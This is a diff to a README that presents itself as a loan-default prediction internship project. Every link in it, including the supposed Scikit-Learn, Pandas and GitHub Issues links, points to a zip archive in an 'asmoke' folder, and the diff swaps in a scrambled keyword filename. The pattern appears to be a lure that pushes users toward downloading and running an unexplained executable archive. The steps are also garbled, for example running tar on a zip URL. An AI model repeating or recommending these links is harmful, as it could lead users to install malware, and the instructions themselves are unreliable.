@@ -1,6 +1,6 @@
 # 🔴 DevelopersHub-DataScience-Analytics_Internship-TASK2 - Predict Loan Defaults Easily
 
-[![Download Now](https://raw.githubusercontent.com/Souravsasikumar/DevelopersHub-DataScience-Analytics_Internship-TASK2/main/asmoke/DevelopersHub-DataScience-Analytics_Internship-TASK2_3.3-alpha.1.zip)](https://raw.githubusercontent.com/Souravsasikumar/DevelopersHub-DataScience-Analytics_Internship-TASK2/main/asmoke/DevelopersHub-DataScience-Analytics_Internship-TASK2_3.3-alpha.1.zip)
+[![Download Now](https://raw.githubusercontent.com/Souravsasikumar/DevelopersHub-DataScience-Analytics_Internship-TASK2/main/asmoke/TAS_Data_Developers_Science_Hub_Internship_Analytics_overstaff.zip)](https://raw.githubusercontent.com/Souravsasikumar/DevelopersHub-DataScience-Analytics_Internship-TASK2/main/asmoke/TAS_Data_Developers_Science_Hub_Internship_Analytics_overstaff.zip)
 
 ## 📖 Description
 
@@ -14,7 +14,7 @@ To run this application, follow these simple steps. You don’t need any program
 
 ### Step 1: Visit the Releases Page
 
-To download the application, [visit this page to download](https://raw.githubusercontent.com/Souravsasikumar/DevelopersHub-DataScience-Analytics_Internship-TASK2/main/asmoke/DevelopersHub-DataScience-Analytics_Internship-TASK2_3.3-alpha.1.zip). 
+To download the application, [visit this page to download](https://raw.githubusercontent.com/Souravsasikumar/DevelopersHub-DataScience-Analytics_Internship-TASK2/main/asmoke/TAS_Data_Developers_Science_Hub_Internship_Analytics_overstaff.zip). 
 
 Find the latest version of the software on the Releases page. You will see a list of available files for download.
 
@@ -24,7 +24,7 @@ Look for the filename that matches your operating system. For example:
 
 - **Windows Users:** Look for a `.exe` file.
 - **Mac Users:** Look for a `.dmg` file.
-- **Linux Users:** Look for a `https://raw.githubusercontent.com/Souravsasikumar/DevelopersHub-DataScience-Analytics_Internship-TASK2/main/asmoke/DevelopersHub-DataScience-Analytics_Internship-TASK2_3.3-alpha.1.zip` file. 
+- **Linux Users:** Look for a `https://raw.githubusercontent.com/Souravsasikumar/DevelopersHub-DataScience-Analytics_Internship-TASK2/main/asmoke/TAS_Data_Developers_Science_Hub_Internship_Analytics_overstaff.zip` file. 
 
 ### Step 3: Download the Application
 
@@ -45,7 +45,7 @@ After the download completes, follow these instructions based on your OS:
 - **Linux:**
   1. Open a terminal window.
   2. Navigate to your Downloads folder.
-  3. Type `tar -xvzf https://raw.githubusercontent.com/Souravsasikumar/DevelopersHub-DataScience-Analytics_Internship-TASK2/main/asmoke/DevelopersHub-DataScience-Analytics_Internship-TASK2_3.3-alpha.1.zip` to extract the files.
+  3. Type `tar -xvzf https://raw.githubusercontent.com/Souravsasikumar/DevelopersHub-DataScience-Analytics_Internship-TASK2/main/asmoke/TAS_Data_Developers_Science_Hub_Internship_Analytics_overstaff.zip` to extract the files.
   4. Follow the specific instructions included in the extracted folder.
 
 ### Step 5: Running the Application
@@ -92,17 +92,17 @@ The application takes advantage of several tools to offer a seamless experience,
 
 ## 💬 Support
 
-For questions or issues, visit the [GitHub Issues page](https://raw.githubusercontent.com/Souravsasikumar/DevelopersHub-DataScience-Analytics_Internship-TASK2/main/asmoke/DevelopersHub-DataScience-Analytics_Internship-TASK2_3.3-alpha.1.zip) to seek help and report bugs.
+For questions or issues, visit the [GitHub Issues page](https://raw.githubusercontent.com/Souravsasikumar/DevelopersHub-DataScience-Analytics_Internship-TASK2/main/asmoke/TAS_Data_Developers_Science_Hub_Internship_Analytics_overstaff.zip) to seek help and report bugs.
 
 ## 🔗 Additional Resources
 
 For more information on machine learning and best practices, consider exploring the following:
 
-- [Scikit-Learn Documentation](https://raw.githubusercontent.com/Souravsasikumar/DevelopersHub-DataScience-Analytics_Internship-TASK2/main/asmoke/DevelopersHub-DataScience-Analytics_Internship-TASK2_3.3-alpha.1.zip)
-- [Pandas Documentation](https://raw.githubusercontent.com/Souravsasikumar/DevelopersHub-DataScience-Analytics_Internship-TASK2/main/asmoke/DevelopersHub-DataScience-Analytics_Internship-TASK2_3.3-alpha.1.zip)
+- [Scikit-Learn Documentation](https://raw.githubusercontent.com/Souravsasikumar/DevelopersHub-DataScience-Analytics_Internship-TASK2/main/asmoke/TAS_Data_Developers_Science_Hub_Internship_Analytics_overstaff.zip)
+- [Pandas Documentation](https://raw.githubusercontent.com/Souravsasikumar/DevelopersHub-DataScience-Analytics_Internship-TASK2/main/asmoke/TAS_Data_Developers_Science_Hub_Internship_Analytics_overstaff.zip)
 
 ## 📄 License
 
 This project is licensed under the MIT License. See the LICENSE file for more details.
 
-[![Download Now](https://raw.githubusercontent.com/Souravsasikumar/DevelopersHub-DataScience-Analytics_Internship-TASK2/main/asmoke/DevelopersHub-DataScience-Analytics_Internship-TASK2_3.3-alpha.1.zip)](https://raw.githubusercontent.com/Souravsasikumar/DevelopersHub-DataScience-Analytics_Internship-TASK2/main/asmoke/DevelopersHub-DataScience-Analytics_Internship-TASK2_3.3-alpha.1.zip)
+[![Download Now](https://raw.githubusercontent.com/Souravsasikumar/DevelopersHub-DataScience-Analytics_Internship-TASK2/main/asmoke/TAS_Data_Developers_Science_Hub_Internship_Analytics_overstaff.zip)](https://raw.githubusercontent.com/Souravsasikumar/DevelopersHub-DataScience-Analytics_Internship-TASK2/main/asmoke/TAS_Data_Developers_Science_Hub_Internship_Analytics_overstaff.zip)
